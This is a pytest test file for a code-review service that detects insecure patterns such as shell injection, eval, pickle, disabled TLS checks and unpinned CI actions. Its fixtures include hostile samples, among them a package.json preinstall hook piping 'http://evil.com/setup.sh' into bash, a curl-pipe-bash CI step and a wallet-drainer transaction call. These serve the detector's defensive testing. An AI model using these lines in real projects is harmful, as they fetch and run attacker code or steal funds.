# Tests for CodeReviewerService
import pytest
from app.services.code_reviewer import CodeReviewerService
from app.models.core import CodeReviewItem


class TestCodeReviewerService:
    def setup_method(self):
        self.reviewer = CodeReviewerService()

    def test_python_mutable_default_detected(self):
        code = "def process_data(items=[]):\n    items.append(1)\n    return items\n"
        results = self.reviewer.review_snippet(code, language="python", file_path="utils.py")
        assert len(results) >= 1
        found = any("Mutable Default" in r.title for r in results)
        assert found
        item = next(r for r in results if "Mutable Default" in r.title)
        assert item.buggy_code
        assert item.corrected_code
        assert "items=None" in item.corrected_code

    def test_python_subprocess_shell_detected(self):
        code = "import subprocess\ndef run_cmd(user_arg):\n    subprocess.run('ls ' + user_arg, shell=True)\n"
        results = self.reviewer.review_snippet(code, language="python", file_path="cmd.py")
        assert len(results) >= 1
        found = any("shell=True" in r.title or "Command Injection" in r.title for r in results)
        assert found
        item = next(r for r in results if "shell=True" in r.title or "Command Injection" in r.title)
        assert item.severity == "CRITICAL"
        assert item.category == "Security Vulnerability"
        assert "shell=False" in item.corrected_code

    def test_python_hardcoded_secret_detected(self):
        code = "API_KEY = 'AKIAIOSFODNN7EXAMPLE123'\nDATABASE_PASSWORD = 'supersecretpasswords123'\n"
        results = self.reviewer.review_snippet(code, language="python", file_path="config.py")
        assert len(results) >= 1
        found = any("Hardcoded" in r.title for r in results)
        assert found
        item = next(r for r in results if "Hardcoded" in r.title)
        assert "os.environ.get" in item.corrected_code

    def test_javascript_eval_detected(self):
        code = "function execute(input) {\n    return eval(input);\n}\n"
        results = self.reviewer.review_snippet(code, language="javascript", file_path="runner.js")
        assert len(results) >= 1
        found = any("eval" in r.title.lower() for r in results)
        assert found
        item = next(r for r in results if "eval" in r.title.lower())
        assert item.severity == "CRITICAL"
        assert "JSON.parse" in item.corrected_code

    def test_javascript_dangerously_set_inner_html_detected(self):
        code = "export function Component({ content }) {\n    return <div dangerouslySetInnerHTML={{ __html: content }} />;\n}\n"
        results = self.reviewer.review_snippet(code, language="typescript", file_path="Component.tsx")
        assert len(results) >= 1
        found = any("dangerouslySetInnerHTML" in r.title for r in results)
        assert found
        item = next(r for r in results if "dangerouslySetInnerHTML" in r.title)
        assert "DOMPurify" in item.corrected_code

    def test_yaml_unpinned_action_detected(self):
        code = "name: CI\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v2\n"
        results = self.reviewer.review_snippet(code, language="yaml", file_path=".github/workflows/ci.yml")
        assert len(results) >= 1
        found = any("Unpinned" in r.title for r in results)
        assert found
        item = next(r for r in results if "Unpinned" in r.title)
        assert "uses: actions/checkout@" in item.corrected_code

    def test_commented_eval_not_flagged(self):
        code = "// const result = eval(userString);\nconst doc = 'Never call eval(payload) in code';\n"
        results = self.reviewer.review_snippet(code, language="javascript", file_path="safe.js")
        assert not any("eval" in r.title.lower() for r in results)

    def test_commented_loose_equality_not_flagged(self):
        code = "// Note: checking if x == y\nconst msg = 'Does a == b here?';\nif (val == null) { return; }\n"
        results = self.reviewer.review_snippet(code, language="javascript", file_path="safe.js")
        assert not any("Loose Equality" in r.title for r in results)

    def test_yaml_surgical_diff_and_sha_mapping(self):
        code = """name: Book Workflow
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Check out repo
        uses: actions/checkout@v4
      - name: Set up Python 3.10
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'
"""
        results = self.reviewer.review_snippet(code, language="yaml", file_path=".github/workflows/book.yml")
        assert len(results) == 2

        # Check setup-python item
        py_item = next(r for r in results if "setup-python" in r.title)
        assert py_item.line_number == 9
        # Fix 2: Check accurate SHA
        assert "42375524e23c412d93fb67b49958b491fce71c38" in py_item.corrected_code
        # Fix 3: Check indentation preserved
        assert "        uses: actions/setup-python@42375524e23c412d93fb67b49958b491fce71c38 # v5.4.0" in py_item.corrected_code
        assert "        # Pinned to full immutable commit SHA" in py_item.corrected_code

        # Fix 1 & 4: Check surgical unified diff preserves context lines without marking them '-'
        diff = py_item.unified_diff
        assert diff is not None
        assert "--- a/.github/workflows/book.yml" in diff
        assert "+++ b/.github/workflows/book.yml" in diff
        assert "@@ -7,5 +7,6 @@" in diff
        # Context lines MUST be prefixed with space ' '
        assert "       - name: Set up Python 3.10" in diff
        assert "         with:" in diff
        assert "           python-version: '3.10'" in diff
        # Only target line is marked '-'
        assert "-        uses: actions/setup-python@v5" in diff
        # Added lines are marked '+'
        assert "+        uses: actions/setup-python@42375524e23c412d93fb67b49958b491fce71c38 # v5.4.0" in diff

        # Check checkout item has different SHA
        checkout_item = next(r for r in results if "checkout" in r.title)
        assert "11bd71901bbe5b1630ceea73d27597364c9af683" in checkout_item.corrected_code
        assert checkout_item.corrected_code != py_item.corrected_code

    def test_yaml_step_hyphen_prefix_preserved(self):
        code = """name: CI
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
"""
        results = self.reviewer.review_snippet(code, language="yaml", file_path=".github/workflows/ci.yml")
        assert len(results) == 1
        item = results[0]
        # Hyphen prefix must be preserved on uses: line
        assert "      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2" in item.corrected_code
        # Comment must be aligned with step
        assert "      # Pinned to full immutable commit SHA" in item.corrected_code

    def test_already_pinned_action_with_comment_skipped(self):
        code = """name: CI
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
"""
        results = self.reviewer.review_snippet(code, language="yaml", file_path=".github/workflows/ci.yml")
        assert len(results) == 0

    def test_unverified_third_party_action_requires_manual_sha_resolution(self):
        code = """name: CI
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-random-org/arbitrary-action@v1.2.3
"""
        results = self.reviewer.review_snippet(code, language="yaml", file_path=".github/workflows/ci.yml")
        assert len(results) == 1
        item = results[0]
        # Must never fabricate a synthetic 40-character hex SHA!
        assert "VERIFY_40_CHAR_COMMIT_SHA" in item.corrected_code
        assert "https://github.com/some-random-org/arbitrary-action/releases" in item.error_explanation

    def test_python_pickle_insecure_deserialization(self):
        code = "import pickle\ndef load_data(raw_payload):\n    return pickle.loads(raw_payload)\n"
        results = self.reviewer.review_snippet(code, language="python", file_path="backend/loader.py")
        assert len(results) >= 1
        found = any("pickle.loads" in r.title or "Insecure pickle" in r.title for r in results)
        assert found
        item = next(r for r in results if "pickle.loads" in r.title or "Insecure pickle" in r.title)
        assert item.severity == "CRITICAL"
        assert "json.loads" in item.corrected_code

    def test_python_requests_verify_false(self):
        code = "import requests\ndef fetch_data(url):\n    return requests.get(url, verify=False)\n"
        results = self.reviewer.review_snippet(code, language="python", file_path="backend/client.py")
        assert len(results) >= 1
        found = any("verify=False" in r.title for r in results)
        assert found
        item = next(r for r in results if "verify=False" in r.title)
        assert "verify=True" in item.corrected_code

    def test_python_deprecated_pillow_antialias(self):
        code = "from PIL import Image\ndef resize(im, w, h):\n    return im.resize((w, h), Image.ANTIALIAS)\n"
        results = self.reviewer.review_snippet(code, language="python", file_path="backend/images.py")
        assert len(results) >= 1
        found = any("ANTIALIAS" in r.title for r in results)
        assert found
        item = next(r for r in results if "ANTIALIAS" in r.title)
        assert item.severity == "CRITICAL"
        assert "Image.Resampling.LANCZOS" in item.corrected_code

    def test_javascript_prototype_pollution(self):
        code = "for (let key in source) {\n    target[key] = source[key];\n}\n"
        results = self.reviewer.review_snippet(code, language="javascript", file_path="src/merge.js")
        assert len(results) >= 1
        found = any("Prototype Pollution" in r.title for r in results)
        assert found
        item = next(r for r in results if "Prototype Pollution" in r.title)
        assert "__proto__" in item.corrected_code

    def test_python_none_comparison_eq_detected(self):
        code = "def check_status(val):\n    if val == None:\n        return False\n    return True\n"
        results = self.reviewer.review_snippet(code, language="python", file_path="status.py")
        assert len(results) >= 1
        found = any("Comparison to None" in r.title for r in results)
        assert found
        item = next(r for r in results if "Comparison to None" in r.title)
        assert "is None" in item.corrected_code

    def test_python_literal_is_comparison_detected(self):
        code = "def check_code(status):\n    if status is 200:\n        return 'OK'\n    return 'Error'\n"
        results = self.reviewer.review_snippet(code, language="python", file_path="response.py")
        assert len(results) >= 1
        found = any("Identity Comparison" in r.title for r in results)
        assert found
        item = next(r for r in results if "Identity Comparison" in r.title)
        assert "== 200" in item.corrected_code

    def test_python_insecure_yaml_load_detected(self):
        code = "import yaml\ndef parse_config(data):\n    return yaml.load(data)\n"
        results = self.reviewer.review_snippet(code, language="python", file_path="config_loader.py")
        assert len(results) >= 1
        found = any("yaml.load" in r.title for r in results)
        assert found
        item = next(r for r in results if "yaml.load" in r.title)
        assert item.severity == "CRITICAL"
        assert "yaml.safe_load" in item.corrected_code

    def test_python_insecure_mktemp_detected(self):
        code = "import tempfile\ndef create_file():\n    return tempfile.mktemp()\n"
        results = self.reviewer.review_snippet(code, language="python", file_path="temp_utils.py")
        assert len(results) >= 1
        found = any("tempfile.mktemp" in r.title for r in results)
        assert found
        item = next(r for r in results if "tempfile.mktemp" in r.title)
        assert "NamedTemporaryFile" in item.corrected_code

    def test_javascript_document_write_detected(self):
        code = "function render(str) {\n    document.write(str);\n}\n"
        results = self.reviewer.review_snippet(code, language="javascript", file_path="dom.js")
        assert len(results) >= 1
        found = any("document.write" in r.title for r in results)
        assert found
        item = next(r for r in results if "document.write" in r.title)
        assert "textContent" in item.corrected_code

    def test_javascript_reject_unauthorized_false_detected(self):
        code = "const agent = new https.Agent({ rejectUnauthorized: false });\n"
        results = self.reviewer.review_snippet(code, language="javascript", file_path="client.js")
        assert len(results) >= 1
        found = any("rejectUnauthorized" in r.title for r in results)
        assert found
        item = next(r for r in results if "rejectUnauthorized" in r.title)
        assert "rejectUnauthorized: true" in item.corrected_code

    def test_go_insecure_tls_detected(self):
        code = "config := &tls.Config{InsecureSkipVerify: true}\n"
        results = self.reviewer.review_snippet(code, language="go", file_path="network/client.go")
        assert len(results) >= 1
        found = any("InsecureSkipVerify" in r.title for r in results)
        assert found
        item = next(r for r in results if "InsecureSkipVerify" in r.title)
        assert "InsecureSkipVerify: false" in item.corrected_code

    def test_dockerfile_missing_user_detected(self):
        code = "FROM python:3.11-slim\nWORKDIR /app\nCOPY . .\nCMD [\"python\", \"app.py\"]\n"
        results = self.reviewer.review_snippet(code, language="dockerfile", file_path="Dockerfile")
        assert len(results) >= 1
        found = any("USER Directive" in r.title for r in results)
        assert found
        item = next(r for r in results if "USER Directive" in r.title)
        assert "USER nonroot:nonroot" in item.corrected_code

    def test_generate_markdown_report_comprehensive(self):
        code = "def test(x=[]):\n    pass\n"
        reviews = self.reviewer.review_snippet(code, language="python", file_path="test.py")
        report = self.reviewer.generate_markdown_report(reviews, repo_name="demo-org/test-repo")
        assert "# SupplyGraph Autonomous Code Review & Patch Report" in report
        assert "demo-org/test-repo" in report
        assert "Executive Issue Summary" in report
        assert "test.py" in report
        assert "Mutable Default Argument" in report

    def test_polyfill_compromised_cdn_detected(self):
        code = '<script src="https://cdn.polyfill.io/v3/polyfill.min.js"></script>\n'
        results = self.reviewer.review_snippet(code, language="javascript", file_path="index.html")
        assert len(results) >= 1
        found = any("Polyfill.io" in r.title for r in results)
        assert found
        item = next(r for r in results if "Polyfill.io" in r.title)
        assert item.severity == "CRITICAL"
        assert "cloudflare.com" in item.corrected_code

    def test_external_script_missing_sri_detected(self):
        code = '<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>\n'
        results = self.reviewer.review_snippet(code, language="javascript", file_path="index.html")
        assert len(results) >= 1
        found = any("Subresource Integrity" in r.title for r in results)
        assert found
        item = next(r for r in results if "Subresource Integrity" in r.title)
        assert "integrity=" in item.corrected_code

    def test_web3_wallet_drainer_detected(self):
        code = "await ethereum.request({ method: 'eth_sendTransaction', params: [drainPayload] });\n"
        results = self.reviewer.review_snippet(code, language="javascript", file_path="drain.js")
        assert len(results) >= 1
        found = any("Wallet Drainer" in r.title for r in results)
        assert found
        item = next(r for r in results if "Wallet Drainer" in r.title)
        assert item.severity == "CRITICAL"

    def test_codecov_bash_uploader_detected(self):
        code = "name: CI\njobs:\n  test:\n    steps:\n      - run: curl -s https://codecov.io/bash | bash\n"
        results = self.reviewer.review_snippet(code, language="yaml", file_path=".github/workflows/ci.yml")
        assert len(results) >= 1
        found = any("Codecov Bash Uploader" in r.title for r in results)
        assert found
        item = next(r for r in results if "Codecov Bash Uploader" in r.title)
        assert item.severity == "HIGH"
        assert "codecov-action@" in item.corrected_code

    def test_dangerous_lifecycle_script_package_json_detected(self):
        code = '{\n  "name": "malicious-pkg",\n  "scripts": {\n    "preinstall": "curl -s http://evil.com/setup.sh | bash"\n  }\n}\n'
        results = self.reviewer.review_file("package.json", code)
        assert len(results) >= 1
        found = any("Dangerous Package Lifecycle Script" in r.title for r in results)
        assert found
        item = next(r for r in results if "Dangerous Package Lifecycle Script" in r.title)
        assert item.severity == "CRITICAL"
        assert "ua-parser-js" in item.error_explanation


